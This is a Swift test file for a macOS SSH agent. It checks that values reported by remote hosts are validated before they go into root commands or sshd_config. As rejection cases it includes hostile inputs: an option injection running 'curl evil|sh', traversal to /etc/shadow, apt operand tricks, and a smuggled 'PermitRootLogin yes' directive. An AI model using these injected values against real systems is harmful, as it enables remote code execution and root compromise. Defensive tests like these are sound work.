import Foundation
import Testing
@testable import AgentSshMacOS

/// Slot validation is what stands between a name a remote host chose and
/// a command that runs as root. Quoting alone does not do this job: it
/// makes a value one shell *word*, which still lets a value beginning
/// with `-` be read as an option, and does nothing at all for a value
/// destined for a config file rather than a shell.
struct CommandSlotKindTests {
    // MARK: Rules every kind shares

    @Test("Every kind rejects a leading dash — quoting cannot stop option injection", arguments: CommandSlotKind.allCases)
    func leadingDashRejectedEverywhere(kind: CommandSlotKind) {
        #expect(kind.validate("-delete") == nil)
        #expect(kind.validate("--no-preserve=mode") == nil)
        #expect(kind.validate("-oProxyCommand=curl evil|sh") == nil)
    }

    @Test("Every kind rejects control characters and newlines", arguments: CommandSlotKind.allCases)
    func controlCharactersRejectedEverywhere(kind: CommandSlotKind) {
        for payload in ["a\nb", "a\rb", "a\u{0000}b", "a\u{0007}b", "a\u{001B}[2Jb"] {
            #expect(kind.validate(payload) == nil, "\(kind) accepted a control character")
        }
    }

    @Test("Every kind rejects empty and whitespace-only values", arguments: CommandSlotKind.allCases)
    func emptyRejectedEverywhere(kind: CommandSlotKind) {
        #expect(kind.validate("") == nil)
        #expect(kind.validate(" ") == nil)
        #expect(kind.validate("\t") == nil)
    }

    @Test("Every kind rejects the replacement character — a lossy decode is not a name", arguments: CommandSlotKind.allCases)
    func replacementCharacterRejected(kind: CommandSlotKind) {
        // String(decoding:as:UTF8.self) substitutes U+FFFD for invalid
        // bytes, so accepting it means targeting a different object than
        // the one the host reported.
        #expect(kind.validate("web\u{FFFD}1") == nil)
    }

    @Test("Validation returns the exact bytes it was given — never a normalized copy", arguments: CommandSlotKind.allCases)
    func validationDoesNotNormalize(kind: CommandSlotKind) {
        let mixed: String
        switch kind {
        case .systemdUnit: mixed = "MyApp.service"
        case .absolutePath: mixed = "/Mnt/Data"
        case .packageName: mixed = "libssl3"
        case .sshdConfigToken: mixed = "hmac-SHA1"
        case .shellWord: mixed = "MixedCase"
        }
        #expect(kind.validate(mixed) == mixed)
    }

    // MARK: systemd units

    @Test("Real systemd unit names are accepted", arguments: [
        "nginx.service", "getty@tty1.service", "user@1000.service",
        "systemd-fsck@dev-disk-by\\x2duuid-1234.service",
        "dbus-org.freedesktop.login1.service", "-.mount", "docker.socket",
        "logrotate.timer", "multi-user.target", "system.slice",
    ])
    func realUnitNamesAccepted(unit: String) {
        // `-.mount` is the root mount and genuinely starts with a dash,
        // so it is the one unit a blanket leading-dash rule would break.
        // It is accepted by exact match, not by relaxing the rule.
        #expect(CommandSlotKind.systemdUnit.validate(unit) == unit)
    }

    @Test("Glob characters are rejected — systemctl expands them itself", arguments: [
        "*.service", "ssh?.service", "[a-z]*.service", "nginx.service *.service",
    ])
    func unitGlobsRejected(unit: String) {
        // `systemctl stop '*.service'` is one perfectly quoted shell word
        // and still stops every unit on the box.
        #expect(CommandSlotKind.systemdUnit.validate(unit) == nil)
    }

    @Test("A unit needs a known suffix, so a bare word cannot become one")
    func unitSuffixRequired() {
        #expect(CommandSlotKind.systemdUnit.validate("nginx") == nil)
        #expect(CommandSlotKind.systemdUnit.validate("nginx.wat") == nil)
        // systemd caps a unit name at 255 bytes; ".service" is 8 of them.
        #expect(CommandSlotKind.systemdUnit.validate(String(repeating: "a", count: 247) + ".service") != nil)
        #expect(CommandSlotKind.systemdUnit.validate(String(repeating: "a", count: 248) + ".service") == nil)
    }

    // MARK: Paths

    @Test("Absolute paths with spaces and non-ASCII are accepted", arguments: [
        "/etc/nginx/nginx.conf", "/mnt/My Backup Drive", "/srv/日本語/app.log",
        "/etc/ssh/sshd_config.d/50-harden-kex.conf",
    ])
    func realPathsAccepted(path: String) {
        #expect(CommandSlotKind.absolutePath.validate(path) == path)
    }

    @Test("Relative paths, traversal, and trailing slashes are rejected", arguments: [
        "etc/passwd", "./x", "../../etc/shadow", "/etc/../root/.ssh", "/etc/nginx/",
    ])
    func unsafePathsRejected(path: String) {
        #expect(CommandSlotKind.absolutePath.validate(path) == nil)
    }

    // MARK: Package names

    @Test("Real package names are accepted", arguments: [
        "openssl", "libssl3", "libssl3:amd64", "containerd.io", "g++-12", "kernel.x86_64", "python3.11",
    ])
    func realPackageNamesAccepted(name: String) {
        #expect(CommandSlotKind.packageName.validate(name) == name)
    }

    @Test("Package operands that apt would reinterpret are rejected", arguments: [
        "/tmp/pwn.deb", "./x.deb", ".*", "nginx=1.2-3", "nginx/stable", "a b",
    ])
    func dangerousPackageOperandsRejected(name: String) {
        // apt treats an argument containing `/` as a local .deb path and
        // `.*` as a regex matching every installed package — neither of
        // which shell quoting affects.
        #expect(CommandSlotKind.packageName.validate(name) == nil)
    }

    @Test("Package operands whose trailing character flips apt's verb are rejected", arguments: [
        "openssh-server-", "openssh-server+", "tzdata-",
    ])
    func aptOperandModifiersRejected(name: String) {
        // apt-get reads a trailing `-` as *remove this* and `+` as
        // *install this*, whichever verb the template wrote, and `--`
        // does not stop it — that is getopt's marker, this is apt's own
        // operand grammar applied afterwards.
        #expect(CommandSlotKind.packageName.validate(name) == nil)
    }

    // MARK: Display integrity

    @Test("Bidi overrides and Unicode separators are rejected everywhere", arguments: CommandSlotKind.allCases)
    func bidiAndSeparatorsRejected(kind: CommandSlotKind) {
        // A value that renders in the confirmation dialog as something
        // other than what runs defeats consent, whatever the shell does.
        for payload in ["/etc\u{202E}gnp.conf", "a\u{200E}b", "a\u{2028}b", "a\u{00A0}b", "a\u{FEFF}b"] {
            #expect(kind.validate(payload) == nil, "\(kind) accepted a display-spoofing scalar")
        }
    }

    @Test("The root filesystem is a valid path — the commonest target of all")
    func rootPathAccepted() {
        #expect(CommandSlotKind.absolutePath.validate("/") == "/")
    }

    // MARK: sshd_config tokens

    @Test("Real SSH algorithm names are accepted", arguments: [
        "hmac-sha1", "hmac-sha2-256", "umac-64-etm@openssh.com",
        "diffie-hellman-group14-sha1", "rsa-sha2-512",
    ])
    func realAlgorithmNamesAccepted(name: String) {
        #expect(CommandSlotKind.sshdConfigToken.validate(name) == name)
    }

    @Test("A config token may not smuggle a second directive")
    func configTokenCannotSmuggleDirective() {
        // This value lands in a config-file body, not a shell word, so
        // quoting is irrelevant — only the charset stops it.
        #expect(CommandSlotKind.sshdConfigToken.validate("x-sha1\nPermitRootLogin yes") == nil)
        #expect(CommandSlotKind.sshdConfigToken.validate("x-sha1 PermitRootLogin") == nil)
        #expect(CommandSlotKind.sshdConfigToken.validate("x#comment") == nil)
        #expect(CommandSlotKind.sshdConfigToken.validate("a,b") == nil)
    }
}
